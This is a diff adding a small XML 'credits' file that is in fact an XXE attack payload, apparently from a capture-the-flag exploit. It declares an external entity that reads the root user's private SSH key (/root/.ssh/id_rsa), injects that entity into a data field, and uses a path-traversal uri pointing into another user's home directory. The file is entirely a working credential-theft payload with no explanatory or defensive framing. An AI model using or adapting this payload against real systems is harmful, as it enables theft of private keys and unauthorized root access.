@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE xxx [
+<!ENTITY dyy SYSTEM "file:///root/.ssh/id_rsa">
+]>
+<credits>
+  <author>damian</author>
+  <image>
+    <data>&dyy;</data>
+    <uri>/../../../../../../home/woodenk/dyy.jpg</uri>
+    <views>3</views>
+  </image>
+  <totalviews>2</totalviews>
+</credits>
